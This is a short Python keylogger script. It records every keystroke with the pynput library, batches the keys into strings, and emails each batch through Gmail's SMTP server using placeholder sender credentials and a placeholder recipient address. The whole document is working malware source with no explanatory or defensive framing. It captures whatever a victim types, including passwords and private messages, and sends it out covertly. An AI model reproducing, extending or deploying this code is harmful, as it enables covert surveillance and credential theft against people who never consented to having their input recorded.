import smtplib
from pynput.keyboard import Listener
num=0
letters=[]
def on_press(key):
	global num,letters
	letters.append(key)
	num=num+1
	if(num>10):
		num=0
		m=""
		for i in letters:
			i=str(i)
			i=i.replace("'","")
			if(i=="Key.space"):
				i=" "
			m=m+i
		print(m)
		letters=[]
		s = smtplib.SMTP('smtp.gmail.com', 587)
		s.starttls()
		s.login("senderMail", "sendPass")
		message = m
		s.sendmail("SendMail", "ReciverMail", message)
		s.quit()
with Listener(on_press=on_press)as listener:
	listener.join()